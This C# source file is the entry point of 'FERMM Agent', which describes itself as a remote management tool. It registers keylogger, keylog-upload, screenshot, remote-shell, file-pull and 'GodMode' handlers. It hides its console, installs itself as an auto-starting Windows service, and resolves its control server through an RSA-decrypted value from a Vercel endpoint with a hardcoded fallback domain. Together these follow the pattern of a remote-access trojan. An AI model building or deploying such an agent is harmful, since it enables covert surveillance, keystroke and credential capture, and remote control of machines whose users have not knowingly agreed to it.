using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using FermmAgent;
using FermmAgent.Services;
using FermmAgent.Handlers;
using FermmAgent.Transport;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Serilog;

namespace FermmAgent;

public class Program
{
    private const string ServiceName = "FERMMAgent";
    private static bool _verboseMode;

    public static async Task<int> Main(string[] args)
    {
        try
        {
            _verboseMode = args.Any(IsVerboseArg);
            var effectiveArgs = args.Where(arg => !IsVerboseArg(arg)).ToArray();

            // Check for service installation/uninstallation commands
            if (effectiveArgs.Length > 0)
            {
                var command = effectiveArgs[0].ToLower();
                switch (command)
                {
                    case "install":
                        return InstallService();
                    case "uninstall":
                        return UninstallService();
                    case "start-service":
                        return StartService();
                    case "stop-service":
                        return StopService();
                    case "status":
                        return CheckServiceStatus();
                    case "--quit":
                    case "-q":
                    case "quit":
                    case "stop":
                        return QuitAgent();
                    case "--overlay":
                    case "overlay":
                        return RunOverlay(effectiveArgs.Skip(1).ToArray());
                }
            }

            // If running interactively (not as service) on Windows
            if (Environment.UserInteractive && RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                var serviceState = GetServiceState();

                // Service is running - just notify and exit
                if (serviceState == ServiceState.Running)
                {
                    Console.WriteLine("FERMM Agent is running in the background service.");
                    Console.WriteLine("Use 'fermm-agent --quit' to stop it.");
                    if (!_verboseMode)
                    {
                        Console.WriteLine("Closing in 10 seconds...");
                        await Task.Delay(10000);
                    }
                    return 0;
                }

                // Service exists but stopped - try to start it
                if (serviceState == ServiceState.Stopped)
                {
                    if (IsRunningAsAdmin())
                    {
                        if (TryRunScCommand($"start \"{ServiceName}\"", out _, out _))
                        {
                            Console.WriteLine("FERMM Agent started in background.");
                            if (!_verboseMode)
                            {
                                Console.WriteLine("Closing in 10 seconds...");
                                await Task.Delay(10000);
                            }
                            return 0;
                        }
                    }
                    else
                    {
                        Console.WriteLine("Service is installed but stopped. Run as admin to start.");
                    }
                }

                // No service - if not verbose, attempt to install and start (admin only)
                if (!_verboseMode && serviceState == null)
                {
                    if (IsRunningAsAdmin())
                    {
                        if (InstallService() == 0)
                        {
                            StartService();
                            Console.WriteLine("FERMM Agent installed and started in background.");
                            Console.WriteLine("Closing in 10 seconds...");
                            await Task.Delay(10000);
                            return 0;
                        }
                    }

                    Console.WriteLine("Running in foreground mode. Install service for background operation:");
                    Console.WriteLine("  fermm-agent install   (requires admin)");
                    Console.WriteLine("");
                    Console.WriteLine("Or use --verbose to run with console output.");
                    Console.WriteLine("Continuing in 10 seconds...");
                    await Task.Delay(10000);
                }
            }

            return await ParseAndRunAsync(effectiveArgs);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Fatal error: {ex.Message}");
            return 1;
        }
    }

    private static int QuitAgent()
    {
        Console.WriteLine("Stopping FERMM Agent...");
        
        var state = GetServiceState();
        if (state == ServiceState.Running)
        {
            if (!IsRunningAsAdmin())
            {
                Console.WriteLine("Error: Admin privileges required to stop the service.");
                return 1;
            }
            
            if (TryRunScCommand($"stop \"{ServiceName}\"", out _, out _))
            {
                Console.WriteLine("FERMM Agent service stopped.");
                return 0;
            }
            else
            {
                Console.WriteLine("Failed to stop service.");
                return 1;
            }
        }
        
        // Try to kill any running process
        try
        {
            var processes = Process.GetProcessesByName("fermm-agent");
            if (processes.Length == 0)
            {
                Console.WriteLine("No FERMM Agent process found.");
                return 0;
            }
            
            foreach (var proc in processes)
            {
                if (proc.Id != Environment.ProcessId)
                {
                    proc.Kill();
                    Console.WriteLine($"Killed process {proc.Id}");
                }
            }
            Console.WriteLine("FERMM Agent stopped.");
            return 0;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error stopping agent: {ex.Message}");
            return 1;
        }
    }

    [System.STAThread]
    private static int RunOverlay(string[] args)
    {
        HideConsoleWindow();

        string deviceId = "test-device";
        
        // Parse --device-id argument
        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "--device-id" && i + 1 < args.Length)
            {
                deviceId = args[i + 1];
                break;
            }
        }

        // Try to load device ID from config
        var configPath = Path.Combine(AppContext.BaseDirectory, ".device_id");
        if (File.Exists(configPath))
        {
            deviceId = File.ReadAllText(configPath).Trim();
        }

        System.Windows.Forms.Application.EnableVisualStyles();
        System.Windows.Forms.Application.SetCompatibleTextRenderingDefault(false);
        System.Windows.Forms.Application.Run(new FermmAgent.UI.OverlayForm(deviceId));
        
        return 0;
    }

    private static bool IsVerboseArg(string arg)
    {
        return arg.Equals("--verbose", StringComparison.OrdinalIgnoreCase)
            || arg.Equals("-v", StringComparison.OrdinalIgnoreCase);
    }

    private static void WriteLineVerbose(string message)
    {
        if (_verboseMode)
        {
            Console.WriteLine(message);
        }
    }

    private static void HideConsoleWindow()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            return;
        }

        var handle = GetConsoleWindow();
        if (handle != IntPtr.Zero)
        {
            ShowWindow(handle, SW_HIDE);
        }

        FreeConsole();
    }

    private const int SW_HIDE = 0;

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll")]
    private static extern bool FreeConsole();

static async Task<int> ParseAndRunAsync(string[] args)
{
    string? serverUrl = null;
    string? confirmUrl = null;
    
    // Parse arguments
    for (int i = 0; i < args.Length; i++)
    {
        switch (args[i].ToLower())
        {
            case "-s":
            case "--server":
                if (i + 1 < args.Length)
                {
                    serverUrl = args[++i];
                }
                break;
                
            case "-confirm":
            case "--confirm":
                if (i + 1 < args.Length)
                {
                    confirmUrl = args[++i];
                }
                break;
                
            case "-cs":
            case "--change-server":
                ChangeServer();
                return 0;
                
            case "--show-config":
            case "-sc":
                ShowConfig();
                return 0;
                
            case "-h":
            case "--help":
                ShowHelp();
                return 0;
        }
    }
    
    // If no args, just run the agent with saved config
    if (args.Length == 0)
    {
        await RunAgentWithAutoConfig();
        return 0;
    }
    
    // If we have -s and/or -confirm, resolve the server URL
    if (serverUrl != null || confirmUrl != null)
    {
        var resolvedUrl = await ResolveServerUrlAsync(serverUrl, confirmUrl);
        if (resolvedUrl != null)
        {
            Environment.SetEnvironmentVariable("FERMM_SERVER_URL", resolvedUrl);
            await RunAgent(args);
            return 0;
        }
        else
        {
            Console.WriteLine("✗ Could not determine server URL. Agent not started.");
            return 1;
        }
    }
    
    return 0;
}

static async Task<string?> ResolveServerUrlAsync(string? serverUrl, string? confirmUrl)
{
    var vercelService = new VercelConfigService();
    
    // Step 1: Try the -s server first
    if (!string.IsNullOrEmpty(serverUrl))
    {
        WriteLineVerbose($"📡 Testing connection to: {serverUrl}");
        
        if (await TestServerConnectionAsync(serverUrl))
        {
            WriteLineVerbose($"✓ Server reachable: {serverUrl}");
            
            // Save to config.dat
            var configData = new VercelConfigService.ConfigData
            {
                ServerUrl = serverUrl,
                ConfirmUrl = confirmUrl ?? "",
                LastUpdated = DateTime.UtcNow.ToString("o")
            };
            var configPath = Path.Combine(AppContext.BaseDirectory, "config.dat");
            var json = System.Text.Json.JsonSerializer.Serialize(configData, 
                new System.Text.Json.JsonSerializerOptions { WriteIndented = true });
            await File.WriteAllTextAsync(configPath, json);
            WriteLineVerbose($"✓ Config saved to: {configPath}");
            
            return serverUrl;
        }
        
        WriteLineVerbose($"✗ Server unreachable: {serverUrl}");
    }
    
    // Step 2: Fall back to -confirm to fetch HOST_URL via RSA
    if (!string.IsNullOrEmpty(confirmUrl))
    {
        WriteLineVerbose($"📡 Falling back to confirm URL: {confirmUrl}");
        var hostUrl = await vercelService.FetchHostUrlAsync(confirmUrl);
        if (hostUrl != null)
        {
            return hostUrl;
        }
    }
    
    // Step 3: Try loading from saved config.dat
    var savedConfig = vercelService.LoadConfig();
    if (savedConfig != null && !string.IsNullOrEmpty(savedConfig.ServerUrl))
    {
        WriteLineVerbose($"📁 Using saved config: {savedConfig.ServerUrl}");
        return savedConfig.ServerUrl;
    }
    
    return null;
}

static async Task<bool> TestServerConnectionAsync(string serverUrl)
{
    try
    {
        using var http = new HttpClient();
        http.Timeout = TimeSpan.FromSeconds(5);
        
        var response = await http.GetAsync($"{serverUrl.TrimEnd('/')}/api/devices/discover");
        return response.IsSuccessStatusCode;
    }
    catch
    {
        return false;
    }
}

static async Task RunAgentWithAutoConfig()
{
    const string DefaultServerUrl = "https://rmm.bware.systems";
    const string DefaultConfirmUrl = "https://linkify-ten-sable.vercel.app";

    // Try to load from environment first
    var envUrl = Environment.GetEnvironmentVariable("FERMM_SERVER_URL");
    if (!string.IsNullOrEmpty(envUrl))
    {
        await RunAgent(Array.Empty<string>());
        return;
    }
    
    // Try to load from config.dat
    var vercelService = new VercelConfigService();
    var savedConfig = vercelService.LoadConfig();
    
    if (savedConfig != null && !string.IsNullOrEmpty(savedConfig.ServerUrl))
    {
        WriteLineVerbose($"📁 Loading server from config.dat: {savedConfig.ServerUrl}");
        
        // Test if server is reachable
        if (await TestServerConnectionAsync(savedConfig.ServerUrl))
        {
            WriteLineVerbose("✓ Server reachable");
            Environment.SetEnvironmentVariable("FERMM_SERVER_URL", savedConfig.ServerUrl);
            await RunAgent(Array.Empty<string>());
            return;
        }
        
        WriteLineVerbose($"✗ Saved server unreachable: {savedConfig.ServerUrl}");
        
        // Try to refresh from confirmUrl if available
        if (!string.IsNullOrEmpty(savedConfig.ConfirmUrl))
        {
            WriteLineVerbose($"📡 Refreshing from confirm URL: {savedConfig.ConfirmUrl}");
            var newUrl = await vercelService.FetchHostUrlAsync(savedConfig.ConfirmUrl);
            if (newUrl != null)
            {
                Environment.SetEnvironmentVariable("FERMM_SERVER_URL", newUrl);
                await RunAgent(Array.Empty<string>());
                return;
            }
        }
    }
    
    // Try default confirm URL (Vercel) first
    WriteLineVerbose($"📡 Trying default confirm URL: {DefaultConfirmUrl}");
    var defaultHostUrl = await vercelService.FetchHostUrlAsync(DefaultConfirmUrl);
    if (!string.IsNullOrEmpty(defaultHostUrl))
    {
        Environment.SetEnvironmentVariable("FERMM_SERVER_URL", defaultHostUrl);
        await RunAgent(Array.Empty<string>());
        return;
    }

    // Fall back to default server URL
    WriteLineVerbose($"⚠️ Falling back to default server: {DefaultServerUrl}");
    Environment.SetEnvironmentVariable("FERMM_SERVER_URL", DefaultServerUrl);
    await RunAgent(Array.Empty<string>());
}

static async Task RunAgent(string[] args)
{
    var builder = Host.CreateApplicationBuilder(args);
    
    // Configure for Windows Service if running as service
    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        builder.Services.AddWindowsService(options =>
        {
            options.ServiceName = "FERMMAgent";
        });
    }
    else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
    {
        builder.Services.AddSystemd();
    }
    
    // Register HTTP client factory first
    builder.Services.AddHttpClient();
    
    // Register HTTP clients with base address
    builder.Services.AddHttpClient("FermmAgent", client =>
    {
        var config = AgentConfig.LoadFromEnvironment();
        if (!string.IsNullOrEmpty(config.ServerUrl))
        {
            client.BaseAddress = new Uri(config.ServerUrl.TrimEnd('/') + "/");
        }
        client.Timeout = TimeSpan.FromSeconds(30);
    });

    // Register config
    var config = AgentConfig.LoadFromEnvironment();
    builder.Services.AddSingleton(config);

    // Register handlers
    builder.Services.AddSingleton<ShellHandler>();
    builder.Services.AddSingleton<ProcessHandler>();
    builder.Services.AddSingleton<FileHandler>();
    builder.Services.AddSingleton<ScreenshotHandler>();
    builder.Services.AddSingleton<KeyloggerHandler>();
    builder.Services.AddSingleton<SysInfoHandler>();
    builder.Services.AddSingleton<GodModeHandler>();
    builder.Services.AddSingleton<ScriptHandler>();
    builder.Services.AddSingleton<FilePullHandler>();
    builder.Services.AddSingleton<OverlayHandler>();
    
    // Register services
    builder.Services.AddSingleton<CommandDispatcher>();
    builder.Services.AddSingleton<WsClient>();
    builder.Services.AddSingleton<PollClient>();
    builder.Services.AddSingleton<DiscoveryService>();
    builder.Services.AddSingleton<VercelConfigService>();
    builder.Services.AddSingleton<OverlayService>();
    builder.Services.AddHostedService<TaskQueueService>();
    builder.Services.AddHostedService<KeylogUploadService>();
    builder.Services.AddHostedService<AgentService>();

    // Configure logging
    builder.Logging.ClearProviders();

    var logPath = ConfigureFileLogging(builder.Logging);

    if (_verboseMode)
    {
        builder.Logging.AddConsole();
    }
    else if (Environment.UserInteractive)
    {
        Console.WriteLine($"FERMM Agent running in background. Logs: {logPath}");
    }
    
    builder.Logging.SetMinimumLevel(LogLevel.Information);

    var host = builder.Build();
    await host.RunAsync();
}

private static string ConfigureFileLogging(ILoggingBuilder logging)
{
    var logPath = Path.Combine(AppContext.BaseDirectory, "logs", "fermm-agent.log");
    Directory.CreateDirectory(Path.GetDirectoryName(logPath)!);

    Log.Logger = new LoggerConfiguration()
        .WriteTo.File(logPath, rollingInterval: RollingInterval.Day, retainedFileCountLimit: 7)
        .CreateLogger();

    logging.AddSerilog();
    return logPath;
}

private static bool TryStartServiceIfAvailable()
{
    var state = GetServiceState();
    if (state == null)
    {
        return false;
    }

    if (state == ServiceState.Running)
    {
        Console.WriteLine("FERMM Agent is already running.");
        return true;
    }

    if (state == ServiceState.Stopped && IsRunningAsAdmin())
    {
        if (TryRunScCommand($"start \"{ServiceName}\"", out _, out _))
        {
            Console.WriteLine("FERMM Agent started in background.");
            return true;
        }
    }

    return false;
}

private enum ServiceState
{
    Running,
    Stopped,
    Unknown
}

private static ServiceState? GetServiceState()
{
    if (!TryRunScCommand($"query \"{ServiceName}\"", out var output, out _))
    {
        return null;
    }

    if (output.Contains("RUNNING", StringComparison.OrdinalIgnoreCase))
    {
        return ServiceState.Running;
    }

    if (output.Contains("STOPPED", StringComparison.OrdinalIgnoreCase))
    {
        return ServiceState.Stopped;
    }

    return ServiceState.Unknown;
}

private static bool TryRunScCommand(string arguments, out string output, out string error)
{
    var startInfo = new ProcessStartInfo
    {
        FileName = "sc",
        Arguments = arguments,
        UseShellExecute = false,
        CreateNoWindow = true,
        RedirectStandardOutput = true,
        RedirectStandardError = true
    };

    using var process = Process.Start(startInfo);
    if (process == null)
    {
        output = string.Empty;
        error = string.Empty;
        return false;
    }

    process.WaitForExit();
    output = process.StandardOutput.ReadToEnd();
    error = process.StandardError.ReadToEnd();
    return process.ExitCode == 0;
}

static void SetServer(string url)
{
    try
    {
        Console.WriteLine($"Setting server to: {url}");
        var configMgr = new FermmAgent.Services.ConfigurationManager();
        configMgr.SetServerUrl(url);
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error saving server URL: {ex.Message}");
    }
}

static void ChangeServer()
{
    Console.WriteLine("Interactive server change:");
    Console.Write("Enter server URL: ");
    var url = Console.ReadLine();
    if (!string.IsNullOrWhiteSpace(url))
    {
        SetServer(url);
    }
    else
    {
        Console.WriteLine("No URL provided. Cancelled.");
    }
}

static void ShowConfig()
{
    var configMgr = new FermmAgent.Services.ConfigurationManager();
    configMgr.PrintConfig();
    
    // Also show config.dat
    Console.WriteLine();
    var vercelService = new VercelConfigService();
    var savedConfig = vercelService.LoadConfig();
    if (savedConfig != null)
    {
        Console.WriteLine("config.dat:");
        Console.WriteLine($"  Server URL: {savedConfig.ServerUrl}");
        Console.WriteLine($"  Confirm URL: {savedConfig.ConfirmUrl}");
        Console.WriteLine($"  Last Updated: {savedConfig.LastUpdated}");
    }
    else
    {
        Console.WriteLine("config.dat: (not found)");
    }
}

static void ShowHelp()
{
    Console.WriteLine(@"
FERMM Agent - Remote Management Agent

Usage:
  fermm-agent                                        Run agent (uses saved config)
  fermm-agent --verbose                              Run with console logs
  fermm-agent --quit                                 Stop the running agent/service
  fermm-agent -s <url>                              Set primary server URL
  fermm-agent -confirm <vercel-url>                 Fetch HOST_URL from Vercel endpoint
  fermm-agent -confirm <vercel-url> -s <url>        Try -s first, fall back to -confirm
  fermm-agent -cs                                   Change server URL interactively
  fermm-agent --show-config                         Display current configuration
  fermm-agent -h, --help                            Show this help message

Service Management (Windows):
  fermm-agent install                               Install as Windows service
  fermm-agent uninstall                             Remove Windows service
  fermm-agent start-service                         Start the service
  fermm-agent stop-service                          Stop the service
  fermm-agent status                                Check service status

Examples:
  fermm-agent -s http://192.168.1.100:8000
  fermm-agent -confirm https://linkify-ten-sable.vercel.app
  fermm-agent -confirm https://linkify-ten-sable.vercel.app -s http://localhost
  fermm-agent --verbose -s http://localhost
  fermm-agent install
  fermm-agent --quit
  fermm-agent --show-config

Configuration Priority:
  1. -s <url>: Test this server first
  2. -confirm <url>: If -s fails or not provided, fetch HOST_URL via RSA
  3. config.dat: Use saved configuration
  4. FERMM_SERVER_URL env var: Environment variable fallback

The -confirm flag uses private_rsa.key to decrypt HOST_URL from a Vercel endpoint.
This allows dynamic server configuration without hardcoding the URL in the binary.
By default, the agent runs as a Windows service in the background.
Use --verbose to run in console mode with visible logs.
");
}

#region Service Management

static int InstallService()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        Console.WriteLine("Service installation is only supported on Windows. Use systemd on Linux.");
        return CreateSystemdService();
    }

    try
    {
        var exePath = Environment.ProcessPath;
        if (string.IsNullOrEmpty(exePath))
        {
            Console.WriteLine("✗ Could not determine executable path");
            return 1;
        }

        // Check if running as administrator
        if (!IsRunningAsAdmin())
        {
            Console.WriteLine("✗ Administrator privileges required to install service");
            Console.WriteLine("  Please run as administrator or use 'Run as administrator'");
            return 1;
        }

        var serviceName = ServiceName;
        var displayName = "FERMM Agent Service";
        var description = "FERMM Remote Management Agent - Provides remote system management capabilities";

        // Create the service
        var startInfo = new ProcessStartInfo
        {
            FileName = "sc",
            Arguments = $"create \"{serviceName}\" binPath= \"{exePath}\" DisplayName= \"{displayName}\" start= auto",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = Process.Start(startInfo);
        process?.WaitForExit();

        if (process?.ExitCode == 0)
        {
            // Set description
            var descStartInfo = new ProcessStartInfo
            {
                FileName = "sc",
                Arguments = $"description \"{serviceName}\" \"{description}\"",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(descStartInfo)?.WaitForExit();

            Console.WriteLine($"✓ Service '{serviceName}' installed successfully");
            Console.WriteLine($"  Display Name: {displayName}");
            Console.WriteLine($"  Executable: {exePath}");
            Console.WriteLine($"  Start Type: Automatic");
            Console.WriteLine();
            Console.WriteLine("To start the service:");
            Console.WriteLine($"  fermm-agent start-service");
            Console.WriteLine($"  net start {serviceName}");
            Console.WriteLine($"  sc start {serviceName}");
            
            return 0;
        }
        else
        {
            var error = process?.StandardError.ReadToEnd() ?? "Unknown error";
            Console.WriteLine($"✗ Failed to install service: {error}");
            return 1;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error installing service: {ex.Message}");
        return 1;
    }
}

static int UninstallService()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        Console.WriteLine("Service uninstallation is only supported on Windows. Use systemctl on Linux.");
        return 1;
    }

    try
    {
        if (!IsRunningAsAdmin())
        {
            Console.WriteLine("✗ Administrator privileges required to uninstall service");
            return 1;
        }

        var serviceName = ServiceName;

        // Stop the service first
        StopService();

        // Delete the service
        var startInfo = new ProcessStartInfo
        {
            FileName = "sc",
            Arguments = $"delete \"{serviceName}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = Process.Start(startInfo);
        process?.WaitForExit();

        if (process?.ExitCode == 0)
        {
            Console.WriteLine($"✓ Service '{serviceName}' uninstalled successfully");
            return 0;
        }
        else
        {
            var error = process?.StandardError.ReadToEnd() ?? "Unknown error";
            Console.WriteLine($"✗ Failed to uninstall service: {error}");
            return 1;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error uninstalling service: {ex.Message}");
        return 1;
    }
}

static int StartService()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        Console.WriteLine("Use: systemctl start fermm-agent");
        return 1;
    }

    try
    {
        var serviceName = ServiceName;
        var startInfo = new ProcessStartInfo
        {
            FileName = "sc",
            Arguments = $"start \"{serviceName}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = Process.Start(startInfo);
        process?.WaitForExit();

        if (process?.ExitCode == 0)
        {
            Console.WriteLine($"✓ Service '{serviceName}' started successfully");
            return 0;
        }
        else
        {
            var output = process?.StandardOutput.ReadToEnd() ?? "";
            var error = process?.StandardError.ReadToEnd() ?? "";
            Console.WriteLine($"✗ Failed to start service: {output} {error}".Trim());
            return 1;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error starting service: {ex.Message}");
        return 1;
    }
}

static int StopService()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        Console.WriteLine("Use: systemctl stop fermm-agent");
        return 1;
    }

    try
    {
        var serviceName = ServiceName;
        var startInfo = new ProcessStartInfo
        {
            FileName = "sc",
            Arguments = $"stop \"{serviceName}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = Process.Start(startInfo);
        process?.WaitForExit();

        if (process?.ExitCode == 0)
        {
            Console.WriteLine($"✓ Service '{serviceName}' stopped successfully");
            return 0;
        }
        else
        {
            var output = process?.StandardOutput.ReadToEnd() ?? "";
            Console.WriteLine($"Service stop result: {output}");
            return 0; // Stop might fail if already stopped, that's OK
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error stopping service: {ex.Message}");
        return 1;
    }
}

static int CheckServiceStatus()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
    {
        Console.WriteLine("Use: systemctl status fermm-agent");
        return 1;
    }

    try
    {
        var serviceName = ServiceName;
        var startInfo = new ProcessStartInfo
        {
            FileName = "sc",
            Arguments = $"query \"{serviceName}\"",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        var process = Process.Start(startInfo);
        process?.WaitForExit();

        var output = process?.StandardOutput.ReadToEnd() ?? "";
        var error = process?.StandardError.ReadToEnd() ?? "";

        if (process?.ExitCode == 0)
        {
            Console.WriteLine($"Service Status for '{serviceName}':");
            Console.WriteLine(output);
            return 0;
        }
        else
        {
            Console.WriteLine($"Service '{serviceName}' is not installed or not accessible");
            if (!string.IsNullOrEmpty(error))
            {
                Console.WriteLine($"Error: {error}");
            }
            return 1;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error checking service status: {ex.Message}");
        return 1;
    }
}

static bool IsRunningAsAdmin()
{
    if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        return false;

    try
    {
        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
        var principal = new System.Security.Principal.WindowsPrincipal(identity);
        return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
    }
    catch
    {
        return false;
    }
}

static int CreateSystemdService()
{
    try
    {
        var exePath = Environment.ProcessPath;
        if (string.IsNullOrEmpty(exePath))
        {
            Console.WriteLine("✗ Could not determine executable path");
            return 1;
        }

        var serviceContent = $@"[Unit]
Description=FERMM Remote Management Agent
After=network.target

[Service]
Type=notify
ExecStart={exePath}
Restart=always
RestartSec=5
User=fermm
Group=fermm
WorkingDirectory={Path.GetDirectoryName(exePath)}

# Security settings
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/log /tmp

[Install]
WantedBy=multi-user.target
";

        var servicePath = "/etc/systemd/system/fermm-agent.service";
        
        Console.WriteLine($"Creating systemd service file at: {servicePath}");
        Console.WriteLine();
        Console.WriteLine("Service content:");
        Console.WriteLine(serviceContent);
        Console.WriteLine();
        Console.WriteLine("To complete installation, run as root:");
        Console.WriteLine($"  sudo tee {servicePath} << 'EOF'");
        Console.WriteLine(serviceContent.TrimEnd());
        Console.WriteLine("EOF");
        Console.WriteLine("  sudo systemctl daemon-reload");
        Console.WriteLine("  sudo systemctl enable fermm-agent");
        Console.WriteLine("  sudo systemctl start fermm-agent");
        
        return 0;
    }
    catch (Exception ex)
    {
        Console.WriteLine($"✗ Error creating systemd service: {ex.Message}");
        return 1;
    }
}

#endregion

}
